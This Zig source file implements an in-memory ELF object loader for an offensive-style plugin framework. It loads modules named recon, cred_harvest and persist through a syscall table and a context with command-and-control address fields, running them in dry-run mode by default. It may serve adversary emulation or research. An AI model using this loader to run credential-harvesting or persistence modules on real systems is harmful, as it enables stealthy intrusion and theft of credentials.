//! ELF Relocatable Object (.o / ET_REL) Loader for Arsenal Plugins
//!
//! Loads compiled C plugin specimens, applies relocations, and calls
//! through the plugin_api.h entry points. Uses only direct syscalls —
//! no libc, no std allocator.
//!
//! Supports relocation types: R_X86_64_64, R_X86_64_PC32,
//! R_X86_64_PLT32, R_X86_64_32S.

const std = @import("std");
const linux = std.os.linux;
const config = @import("config.zig");
const syscall = @import("syscall.zig");

// ── Memory / file constants ────────────────────────────────────────────

const PAGE_SIZE: usize = 4096;
const PROT_READ: usize = 1;
const PROT_WRITE: usize = 2;
const PROT_EXEC: usize = 4;
const MAP_PRIVATE: usize = 0x02;
const MAP_ANONYMOUS: usize = 0x20;
const MAP_32BIT: usize = 0x40; // Allocate in the low 2GB — required for R_X86_64_PC32/PLT32 relocations
const O_RDONLY: usize = 0;
const AT_FDCWD: usize = @bitCast(@as(isize, -100));
const NOFD: usize = @bitCast(@as(isize, -1));
const MAX_FILE_SIZE: usize = 256 * 1024;

// ── ELF constants ──────────────────────────────────────────────────────

const ET_REL: u16 = 1;
const SHT_PROGBITS: u32 = 1;
const SHT_SYMTAB: u32 = 2;
const SHT_STRTAB: u32 = 3;
const SHT_RELA: u32 = 4;
const SHT_NOBITS: u32 = 8;
const SHF_ALLOC: u64 = 0x02;
const SHF_WRITE: u64 = 0x01;
const SHF_EXECINSTR: u64 = 0x04;
const SHN_UNDEF: u16 = 0;
const STB_GLOBAL: u8 = 1;

// Relocation types
const R_X86_64_64: u32 = 1;
const R_X86_64_PC32: u32 = 2;
const R_X86_64_PLT32: u32 = 4;
const R_X86_64_32S: u32 = 11;

// ELF magic
const ELFMAG = [4]u8{ 0x7f, 'E', 'L', 'F' };

// ── ELF structures (extern = C ABI layout) ─────────────────────────────

const Elf64_Ehdr = extern struct {
    e_ident: [16]u8,
    e_type: u16,
    e_machine: u16,
    e_version: u32,
    e_entry: u64,
    e_phoff: u64,
    e_shoff: u64,
    e_flags: u32,
    e_ehsize: u16,
    e_phentsize: u16,
    e_phnum: u16,
    e_shentsize: u16,
    e_shnum: u16,
    e_shstrndx: u16,
};

const Elf64_Shdr = extern struct {
    sh_name: u32,
    sh_type: u32,
    sh_flags: u64,
    sh_addr: u64,
    sh_offset: u64,
    sh_size: u64,
    sh_link: u32,
    sh_info: u32,
    sh_addralign: u64,
    sh_entsize: u64,
};

const Elf64_Sym = extern struct {
    st_name: u32,
    st_info: u8,
    st_other: u8,
    st_shndx: u16,
    st_value: u64,
    st_size: u64,
};

const Elf64_Rela = extern struct {
    r_offset: u64,
    r_info: u64,
    r_addend: i64,
};

// ── Plugin C ABI types (match plugin_api.h) ────────────────────────────

const SyscallTableC = extern struct {
    syscall0: *const fn (isize) callconv(.c) isize,
    syscall1: *const fn (isize, isize) callconv(.c) isize,
    syscall2: *const fn (isize, isize, isize) callconv(.c) isize,
    syscall3: *const fn (isize, isize, isize, isize) callconv(.c) isize,
    syscall4: *const fn (isize, isize, isize, isize, isize) callconv(.c) isize,
    syscall5: *const fn (isize, isize, isize, isize, isize, isize) callconv(.c) isize,
    syscall6: *const fn (isize, isize, isize, isize, isize, isize, isize) callconv(.c) isize,
};

const OutputBuffer = extern struct {
    data: ?[*]u8,
    capacity: usize,
    length: usize,
};

const PluginContext = extern struct {
    mode: i32, // ExecMode: 0=normal, 1=dry_run, 2=verbose
    _pad0: [4]u8 = .{ 0, 0, 0, 0 }, // alignment padding for output.data pointer
    output: OutputBuffer,
    syscalls: ?*SyscallTableC,
    c2_addr: ?[*:0]const u8,
    c2_port: u16,
    _pad1: u16 = 0,
    flags: u32,
};

const PluginInfoC = extern struct {
    name: ?[*:0]const u8,
    version: ?[*:0]const u8,
    description: ?[*:0]const u8,
    author: ?[*:0]const u8,
    api_version: u32,
    capabilities: u32,
};

// Function pointer types for plugin entry points
const PluginInfoFn = *const fn () callconv(.c) ?*const PluginInfoC;
const PluginInitFn = *const fn (*PluginContext) callconv(.c) i32;
const PluginExecFn = *const fn (*PluginContext) callconv(.c) i32;
const PluginCleanupFn = *const fn (*PluginContext) callconv(.c) i32;

// ── Syscall dispatch wrappers (C ABI, for plugin SyscallTable) ─────────

fn wrap_syscall0(nr: isize) callconv(.c) isize {
    return asm volatile ("syscall"
        : [ret] "={rax}" (-> isize),
        : [number] "{rax}" (nr),
        : .{ .rcx = true, .r11 = true, .memory = true });
}

fn wrap_syscall1(nr: isize, a1: isize) callconv(.c) isize {
    return asm volatile ("syscall"
        : [ret] "={rax}" (-> isize),
        : [number] "{rax}" (nr),
          [arg1] "{rdi}" (a1),
        : .{ .rcx = true, .r11 = true, .memory = true });
}

fn wrap_syscall2(nr: isize, a1: isize, a2: isize) callconv(.c) isize {
    return asm volatile ("syscall"
        : [ret] "={rax}" (-> isize),
        : [number] "{rax}" (nr),
          [arg1] "{rdi}" (a1),
          [arg2] "{rsi}" (a2),
        : .{ .rcx = true, .r11 = true, .memory = true });
}

fn wrap_syscall3(nr: isize, a1: isize, a2: isize, a3: isize) callconv(.c) isize {
    return asm volatile ("syscall"
        : [ret] "={rax}" (-> isize),
        : [number] "{rax}" (nr),
          [arg1] "{rdi}" (a1),
          [arg2] "{rsi}" (a2),
          [arg3] "{rdx}" (a3),
        : .{ .rcx = true, .r11 = true, .memory = true });
}

fn wrap_syscall4(nr: isize, a1: isize, a2: isize, a3: isize, a4: isize) callconv(.c) isize {
    return asm volatile ("syscall"
        : [ret] "={rax}" (-> isize),
        : [number] "{rax}" (nr),
          [arg1] "{rdi}" (a1),
          [arg2] "{rsi}" (a2),
          [arg3] "{rdx}" (a3),
          [arg4] "{r10}" (a4),
        : .{ .rcx = true, .r11 = true, .memory = true });
}

fn wrap_syscall5(nr: isize, a1: isize, a2: isize, a3: isize, a4: isize, a5: isize) callconv(.c) isize {
    return asm volatile ("syscall"
        : [ret] "={rax}" (-> isize),
        : [number] "{rax}" (nr),
          [arg1] "{rdi}" (a1),
          [arg2] "{rsi}" (a2),
          [arg3] "{rdx}" (a3),
          [arg4] "{r10}" (a4),
          [arg5] "{r8}" (a5),
        : .{ .rcx = true, .r11 = true, .memory = true });
}

fn wrap_syscall6(nr: isize, a1: isize, a2: isize, a3: isize, a4: isize, a5: isize, a6: isize) callconv(.c) isize {
    return asm volatile ("syscall"
        : [ret] "={rax}" (-> isize),
        : [number] "{rax}" (nr),
          [arg1] "{rdi}" (a1),
          [arg2] "{rsi}" (a2),
          [arg3] "{rdx}" (a3),
          [arg4] "{r10}" (a4),
          [arg5] "{r8}" (a5),
          [arg6] "{r9}" (a6),
        : .{ .rcx = true, .r11 = true, .memory = true });
}

// Static syscall dispatch table instance
var g_syscall_table = SyscallTableC{
    .syscall0 = &wrap_syscall0,
    .syscall1 = &wrap_syscall1,
    .syscall2 = &wrap_syscall2,
    .syscall3 = &wrap_syscall3,
    .syscall4 = &wrap_syscall4,
    .syscall5 = &wrap_syscall5,
    .syscall6 = &wrap_syscall6,
};

// ── memcpy implementation for plugin use ───────────────────────────────

fn plugin_memcpy(dst: ?[*]u8, src: ?[*]const u8, n: usize) callconv(.c) ?[*]u8 {
    if (dst) |d| {
        if (src) |s| {
            var i: usize = 0;
            while (i < n) : (i += 1) {
                d[i] = s[i];
            }
        }
    }
    return dst;
}

// ── Known plugin files ─────────────────────────────────────────────────

const PLUGIN_FILES = [_][]const u8{
    "recon.o",
    "cred_harvest.o",
    "persist.o",
};

// ── Internal helpers ───────────────────────────────────────────────────

const MAX_SECTIONS: usize = 32;

fn alignUp(val: usize, alignment: usize) usize {
    if (alignment <= 1) return val;
    const mask = alignment - 1;
    return (val + mask) & ~mask;
}

fn pageAlignUp(val: usize) usize {
    return alignUp(val, PAGE_SIZE);
}

fn relaSymIdx(info: u64) u32 {
    return @intCast(info >> 32);
}

fn relaType(info: u64) u32 {
    return @truncate(info);
}

fn symBinding(info: u8) u8 {
    return info >> 4;
}

/// Get a null-terminated string from a string table.
fn getStr(base: [*]const u8, offset: u32) []const u8 {
    const s = base + offset;
    var len: usize = 0;
    while (s[len] != 0) : (len += 1) {
        if (len > 512) break; // safety limit
    }
    return s[0..len];
}

/// Copy bytes from src to dst (no overlap assumed).
fn memcpyBytes(dst: [*]u8, src: [*]const u8, n: usize) void {
    var i: usize = 0;
    while (i < n) : (i += 1) {
        dst[i] = src[i];
    }
}

/// Zero-fill a region.
fn memzero(dst: [*]u8, n: usize) void {
    var i: usize = 0;
    while (i < n) : (i += 1) {
        dst[i] = 0;
    }
}

/// Build a null-terminated path: dir + "/" + filename → buf.
/// Returns the length (excluding null), or null if overflow.
fn buildPath(buf: *[512]u8, dir: []const u8, filename: []const u8) ?usize {
    var pos: usize = 0;

    // Copy dir
    if (pos + dir.len >= buf.len) return null;
    @memcpy(buf[pos..][0..dir.len], dir);
    pos += dir.len;

    // Ensure trailing slash
    if (pos > 0 and buf[pos - 1] != '/') {
        if (pos >= buf.len) return null;
        buf[pos] = '/';
        pos += 1;
    }

    // Copy filename
    if (pos + filename.len >= buf.len) return null;
    @memcpy(buf[pos..][0..filename.len], filename);
    pos += filename.len;

    // Null terminate
    buf[pos] = 0;
    return pos;
}

// ── File I/O ───────────────────────────────────────────────────────────

const FileData = struct {
    ptr: [*]u8,
    len: usize,
    buf_size: usize,
};

/// Read an entire file into an mmap'd buffer. Returns null on failure.
fn readFile(path: [*:0]const u8) ?FileData {
    const fd = syscall.sys_openat(AT_FDCWD, path, O_RDONLY, 0);
    if (fd < 0) return null;
    defer _ = syscall.sys_close(@intCast(fd));

    // Allocate buffer
    const buf_size = MAX_FILE_SIZE;
    const rc = syscall.sys_mmap(0, buf_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, NOFD, 0);
    if (rc < 0) return null;
    const buf: [*]u8 = @ptrFromInt(@as(usize, @intCast(rc)));

    // Read entire file
    var total: usize = 0;
    while (total < buf_size) {
        const n = syscall.sys_read(@intCast(fd), buf + total, buf_size - total);
        if (n <= 0) break;
        total += @intCast(n);
    }

    if (total == 0) {
        _ = syscall.sys_munmap(@intFromPtr(buf), buf_size);
        return null;
    }

    return .{ .ptr = buf, .len = total, .buf_size = buf_size };
}

// ── Core ELF loader ────────────────────────────────────────────────────

/// Load and execute a single plugin .o file.
/// Returns true on success, false on failure (logged, never crashes).
fn loadAndExecPlugin(path: [*:0]const u8, mode: i32, verbose: bool) bool {
    // ── Step 1: Read file ───────────────────────────────────────────
    const file = readFile(path) orelse {
        if (verbose) {
            config.jsonLog("debug", "plugin_loader", "\"error\":\"file_not_found\"");
        }
        return false;
    };
    defer _ = syscall.sys_munmap(@intFromPtr(file.ptr), file.buf_size);

    // ── Step 2: Validate ELF header ─────────────────────────────────
    if (file.len < @sizeOf(Elf64_Ehdr)) return false;
    const ehdr: *const Elf64_Ehdr = @ptrCast(@alignCast(file.ptr));

    if (ehdr.e_ident[0] != ELFMAG[0] or ehdr.e_ident[1] != ELFMAG[1] or
        ehdr.e_ident[2] != ELFMAG[2] or ehdr.e_ident[3] != ELFMAG[3])
    {
        config.jsonLog("warn", "plugin_loader", "\"error\":\"bad_elf_magic\"");
        return false;
    }
    if (ehdr.e_type != ET_REL) {
        config.jsonLog("warn", "plugin_loader", "\"error\":\"not_ET_REL\"");
        return false;
    }

    const shnum: usize = ehdr.e_shnum;
    if (shnum == 0 or shnum > MAX_SECTIONS) return false;

    // Validate section header table fits in file
    const sh_end = ehdr.e_shoff + @as(u64, shnum) * @sizeOf(Elf64_Shdr);
    if (sh_end > file.len) return false;

    // ── Step 3: Parse section headers ───────────────────────────────
    // Get section header array base
    const shdr_base: [*]const u8 = file.ptr + @as(usize, @intCast(ehdr.e_shoff));

    // Find .symtab, .strtab, and categorize ALLOC sections
    var symtab_idx: usize = 0;
    var strtab_idx: usize = 0;
    var code_size: usize = 0;
    var rodata_size: usize = 0;
    var data_size: usize = 0;

    // Track per-section info for layout
    const SectionZone = enum { none, code, rodata, data };
    var sec_zone: [MAX_SECTIONS]SectionZone = .{.none} ** MAX_SECTIONS;
    var sec_zone_offset: [MAX_SECTIONS]usize = .{0} ** MAX_SECTIONS; // offset within zone

    for (0..shnum) |i| {
        const shdr = getSectionHeader(shdr_base, i);

        if (shdr.sh_type == SHT_SYMTAB) {
            symtab_idx = i;
            strtab_idx = shdr.sh_link; // .strtab linked from .symtab
        }

        if (shdr.sh_flags & SHF_ALLOC == 0) continue;

        const alignment = if (shdr.sh_addralign > 0) @as(usize, @intCast(shdr.sh_addralign)) else 1;
        const size: usize = @intCast(shdr.sh_size);

        if (shdr.sh_flags & SHF_EXECINSTR != 0) {
            // Code section
            code_size = alignUp(code_size, alignment);
            sec_zone[i] = .code;
            sec_zone_offset[i] = code_size;
            code_size += size;
        } else if (shdr.sh_flags & SHF_WRITE != 0) {
            // Writable data section
            data_size = alignUp(data_size, alignment);
            sec_zone[i] = .data;
            sec_zone_offset[i] = data_size;
            data_size += size;
        } else {
            // Read-only data section
            rodata_size = alignUp(rodata_size, alignment);
            sec_zone[i] = .rodata;
            sec_zone_offset[i] = rodata_size;
            rodata_size += size;
        }
    }

    if (symtab_idx == 0) {
        config.jsonLog("warn", "plugin_loader", "\"error\":\"no_symtab\"");
        return false;
    }

    // ── Step 4: Allocate execution memory ───────────────────────────
    const code_pages = pageAlignUp(if (code_size > 0) code_size else 1);
    const rodata_pages = pageAlignUp(if (rodata_size > 0) rodata_size else 1);
    const data_pages = pageAlignUp(if (data_size > 0) data_size else 1);
    const total_size = code_pages + rodata_pages + data_pages;

    const mem_rc = syscall.sys_mmap(0, total_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_32BIT, NOFD, 0);
    if (mem_rc < 0) {
        config.jsonLog("warn", "plugin_loader", "\"error\":\"mmap_failed\"");
        return false;
    }
    const mem_base: [*]u8 = @ptrFromInt(@as(usize, @intCast(mem_rc)));
    defer _ = syscall.sys_munmap(@intFromPtr(mem_base), total_size);

    // Zone base addresses
    const code_base: usize = @intFromPtr(mem_base);
    const rodata_base: usize = code_base + code_pages;
    const data_base: usize = rodata_base + rodata_pages;

    // Zero the entire region
    memzero(mem_base, total_size);

    // ── Step 5: Build section address map and copy data ─────────────
    var section_addrs: [MAX_SECTIONS]usize = .{0} ** MAX_SECTIONS;

    for (0..shnum) |i| {
        const zone = sec_zone[i];
        if (zone == .none) continue;

        const zone_base = switch (zone) {
            .code => code_base,
            .rodata => rodata_base,
            .data => data_base,
            .none => unreachable,
        };
        section_addrs[i] = zone_base + sec_zone_offset[i];

        const shdr = getSectionHeader(shdr_base, i);
        const size: usize = @intCast(shdr.sh_size);

        // Copy section data (skip NOBITS like .bss)
        if (shdr.sh_type != SHT_NOBITS and size > 0) {
            const file_off: usize = @intCast(shdr.sh_offset);
            if (file_off + size <= file.len) {
                const dst: [*]u8 = @ptrFromInt(section_addrs[i]);
                memcpyBytes(dst, file.ptr + file_off, size);
            }
        }
    }

    // ── Step 6: Resolve symbols and apply relocations ───────────────
    const symtab_shdr = getSectionHeader(shdr_base, symtab_idx);
    const symtab_off: usize = @intCast(symtab_shdr.sh_offset);
    const symtab_size: usize = @intCast(symtab_shdr.sh_size);
    const sym_count = symtab_size / @sizeOf(Elf64_Sym);

    // Get string table
    const strtab_shdr = getSectionHeader(shdr_base, strtab_idx);
    const strtab_off: usize = @intCast(strtab_shdr.sh_offset);
    if (strtab_off >= file.len) return false;
    const strtab: [*]const u8 = file.ptr + strtab_off;

    // Process all RELA sections
    for (0..shnum) |i| {
        const shdr = getSectionHeader(shdr_base, i);
        if (shdr.sh_type != SHT_RELA) continue;

        // sh_info = target section index
        const target_sec: usize = shdr.sh_info;
        if (target_sec >= shnum or section_addrs[target_sec] == 0) continue;

        const rela_off: usize = @intCast(shdr.sh_offset);
        const rela_size: usize = @intCast(shdr.sh_size);
        const rela_count = rela_size / @sizeOf(Elf64_Rela);

        for (0..rela_count) |ri| {
            const rela_ptr: usize = rela_off + ri * @sizeOf(Elf64_Rela);
            if (rela_ptr + @sizeOf(Elf64_Rela) > file.len) break;

            const rela: *const Elf64_Rela = @ptrCast(@alignCast(file.ptr + rela_ptr));
            const sym_idx = relaSymIdx(rela.r_info);
            const rtype = relaType(rela.r_info);

            if (sym_idx >= sym_count) continue;

            // Get symbol
            const sym_ptr: usize = symtab_off + @as(usize, sym_idx) * @sizeOf(Elf64_Sym);
            if (sym_ptr + @sizeOf(Elf64_Sym) > file.len) continue;
            const sym: *const Elf64_Sym = @ptrCast(@alignCast(file.ptr + sym_ptr));

            // Resolve symbol value (S)
            var s_val: usize = 0;
            if (sym.st_shndx == SHN_UNDEF) {
                // External symbol — resolve by name
                const name = getStr(strtab, sym.st_name);
                if (std.mem.eql(u8, name, "memcpy")) {
                    s_val = @intFromPtr(&plugin_memcpy);
                } else {
                    // Unknown external — skip
                    if (verbose) {
                        config.jsonLog("debug", "plugin_loader", "\"warn\":\"unresolved_symbol\"");
                    }
                    continue;
                }
            } else if (sym.st_shndx < MAX_SECTIONS) {
                // Defined in a section
                s_val = section_addrs[sym.st_shndx] + @as(usize, @intCast(sym.st_value));
            } else {
                continue;
            }

            // Compute P (relocation target address)
            const p_val: usize = section_addrs[target_sec] + @as(usize, @intCast(rela.r_offset));
            const a_val: i64 = rela.r_addend;

            // Apply relocation
            switch (rtype) {
                R_X86_64_64 => {
                    // S + A (64-bit absolute)
                    const val: u64 = @bitCast(@as(i64, @intCast(s_val)) + a_val);
                    const dst: *align(1) u64 = @ptrFromInt(p_val);
                    dst.* = val;
                },
                R_X86_64_PC32, R_X86_64_PLT32 => {
                    // S + A - P (32-bit PC-relative)
                    const val: i64 = @as(i64, @intCast(s_val)) + a_val - @as(i64, @intCast(p_val));
                    if (val < -0x80000000 or val > 0x7FFFFFFF) {
                        if (verbose) config.jsonLog("warn", "plugin_loader", "\"error\":\"relocation_overflow_pc32\"");
                        continue;
                    }
                    const dst: *align(1) i32 = @ptrFromInt(p_val);
                    dst.* = @intCast(val);
                },
                R_X86_64_32S => {
                    // S + A (32-bit signed absolute)
                    const val: i64 = @as(i64, @intCast(s_val)) + a_val;
                    if (val < -0x80000000 or val > 0x7FFFFFFF) {
                        if (verbose) config.jsonLog("warn", "plugin_loader", "\"error\":\"relocation_overflow_32s\"");
                        continue;
                    }
                    const dst: *align(1) i32 = @ptrFromInt(p_val);
                    dst.* = @intCast(val);
                },
                else => {
                    // Unsupported relocation type — skip
                    continue;
                },
            }
        }
    }

    // ── Step 7: Set memory protections ──────────────────────────────
    if (code_size > 0) {
        _ = syscall.sys_mprotect(code_base, code_pages, PROT_READ | PROT_EXEC);
    }
    if (rodata_size > 0) {
        _ = syscall.sys_mprotect(rodata_base, rodata_pages, PROT_READ);
    }
    // data zone stays RW (already set by mmap)

    // ── Step 8: Find plugin entry points ────────────────────────────
    var fn_info: ?PluginInfoFn = null;
    var fn_init: ?PluginInitFn = null;
    var fn_exec: ?PluginExecFn = null;
    var fn_cleanup: ?PluginCleanupFn = null;

    for (0..sym_count) |si| {
        const sym_ptr: usize = symtab_off + si * @sizeOf(Elf64_Sym);
        if (sym_ptr + @sizeOf(Elf64_Sym) > file.len) break;
        const sym: *const Elf64_Sym = @ptrCast(@alignCast(file.ptr + sym_ptr));

        if (symBinding(sym.st_info) != STB_GLOBAL) continue;
        if (sym.st_shndx == SHN_UNDEF or sym.st_shndx >= MAX_SECTIONS) continue;

        const addr = section_addrs[sym.st_shndx] + @as(usize, @intCast(sym.st_value));
        if (addr == 0) continue;

        const name = getStr(strtab, sym.st_name);
        if (std.mem.eql(u8, name, "plugin_info")) {
            fn_info = @ptrFromInt(addr);
        } else if (std.mem.eql(u8, name, "plugin_init")) {
            fn_init = @ptrFromInt(addr);
        } else if (std.mem.eql(u8, name, "plugin_exec")) {
            fn_exec = @ptrFromInt(addr);
        } else if (std.mem.eql(u8, name, "plugin_cleanup")) {
            fn_cleanup = @ptrFromInt(addr);
        }
    }

    // ── Step 9: Execute plugin ──────────────────────────────────────
    // Get plugin info
    var plugin_name: []const u8 = "unknown";
    if (fn_info) |info_fn| {
        const info_ptr = info_fn();
        if (info_ptr) |info| {
            if (info.name) |n| {
                plugin_name = std.mem.span(n);
            }
        }
    }

    // Prepare output buffer (on stack)
    var output_buf: [65536]u8 = undefined;
    memzero(&output_buf, output_buf.len);

    var ctx = PluginContext{
        .mode = mode,
        .output = .{
            .data = &output_buf,
            .capacity = output_buf.len,
            .length = 0,
        },
        .syscalls = &g_syscall_table,
        .c2_addr = null,
        .c2_port = 0,
        .flags = 0,
    };

    // Call plugin_init
    if (fn_init) |init_fn| {
        const init_rc = init_fn(&ctx);
        if (init_rc != 0) {
            var buf: [128]u8 = undefined;
            const extra = std.fmt.bufPrint(&buf, "\"plugin\":\"{s}\",\"error\":\"init_failed\",\"rc\":{d}", .{ plugin_name, init_rc }) catch return false;
            config.jsonLog("warn", "plugin_loader", extra);
            return false;
        }
    }

    // Call plugin_exec
    var exec_rc: i32 = -1;
    if (fn_exec) |exec_fn| {
        exec_rc = exec_fn(&ctx);
    } else {
        config.jsonLog("warn", "plugin_loader", "\"error\":\"no_plugin_exec\"");
        return false;
    }

    // Log output
    {
        var buf: [256]u8 = undefined;
        const out_len = ctx.output.length;
        const extra = std.fmt.bufPrint(&buf, "\"plugin\":\"{s}\",\"rc\":{d},\"output_len\":{d},\"mode\":{d}", .{
            plugin_name, exec_rc, out_len, mode,
        }) catch "";
        config.jsonLog("info", "plugin_exec", extra);
    }

    // Log first portion of output if verbose
    if (verbose and ctx.output.length > 0) {
        const out_slice = output_buf[0..@min(ctx.output.length, 512)];
        var buf: [768]u8 = undefined;
        const extra = std.fmt.bufPrint(&buf, "\"plugin\":\"{s}\",\"output\":\"{s}\"", .{ plugin_name, out_slice }) catch "";
        config.jsonLog("debug", "plugin_output", extra);
    }

    // Call plugin_cleanup
    if (fn_cleanup) |cleanup_fn| {
        _ = cleanup_fn(&ctx);
    }

    return true;
}

/// Get a section header by index from the section header table base.
fn getSectionHeader(shdr_base: [*]const u8, idx: usize) *const Elf64_Shdr {
    const offset = idx * @sizeOf(Elf64_Shdr);
    return @ptrCast(@alignCast(shdr_base + offset));
}

// ── Public API ─────────────────────────────────────────────────────────

/// Load and execute all arsenal plugins from the given directory.
/// Plugins are executed in dry-run mode by default.
/// Gracefully handles missing files (logs warning, continues).
pub fn loadAndRunPlugins(arsenal_dir: []const u8, dry_run: bool, verbose_flag: bool) void {
    config.jsonLog("info", "plugin_loader", "\"phase\":\"start\"");

    const exec_mode: i32 = if (dry_run) 1 else 0; // EXEC_MODE_DRY_RUN=1, EXEC_MODE_NORMAL=0
    var loaded: u32 = 0;
    var failed: u32 = 0;

    for (PLUGIN_FILES) |filename| {
        var path_buf: [512]u8 = undefined;
        const path_len = buildPath(&path_buf, arsenal_dir, filename) orelse {
            config.jsonLog("warn", "plugin_loader", "\"error\":\"path_too_long\"");
            failed += 1;
            continue;
        };

        // Create sentinel-terminated pointer for syscall
        const path: [*:0]const u8 = @ptrCast(path_buf[0..path_len :0]);

        if (verbose_flag) {
            var log_buf: [256]u8 = undefined;
            const extra = std.fmt.bufPrint(&log_buf, "\"loading\":\"{s}\"", .{filename}) catch "";
            config.jsonLog("debug", "plugin_loader", extra);
        }

        if (loadAndExecPlugin(path, exec_mode, verbose_flag)) {
            loaded += 1;
        } else {
            failed += 1;
        }
    }

    {
        var buf: [128]u8 = undefined;
        const extra = std.fmt.bufPrint(&buf, "\"phase\":\"complete\",\"loaded\":{d},\"failed\":{d}", .{ loaded, failed }) catch "";
        config.jsonLog("info", "plugin_loader", extra);
    }
}
